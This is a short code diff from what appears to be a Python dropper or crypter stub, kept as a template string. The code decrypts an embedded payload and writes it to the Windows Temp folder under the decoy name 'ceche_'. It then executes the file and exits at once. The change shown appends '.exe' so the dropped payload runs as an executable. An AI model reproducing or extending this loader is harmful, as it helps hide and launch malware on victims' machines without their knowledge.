@@ -231,9 +231,9 @@ with open(sa, 'rb') as file:
 
 decrypted_data = f.decrypt(encrypted_data)
 
-with open(r"C:\Users\\" + os.environ.get('USERNAME') + r"\AppData\Local\Temp\ceche_" + name, 'wb') as file:
+with open(r"C:\Users\\" + os.environ.get('USERNAME') + r"\AppData\Local\Temp\ceche_" + name+".exe", 'wb') as file:
     file.write(decrypted_data)
-subprocess.call(r"C:\Users\\" + os.environ.get('USERNAME') + r"\AppData\Local\Temp\ceche_" + name)
+subprocess.call(r"C:\Users\\" + os.environ.get('USERNAME') + r"\AppData\Local\Temp\ceche_" + name+".exe")
 
 os._exit(0)
             '''
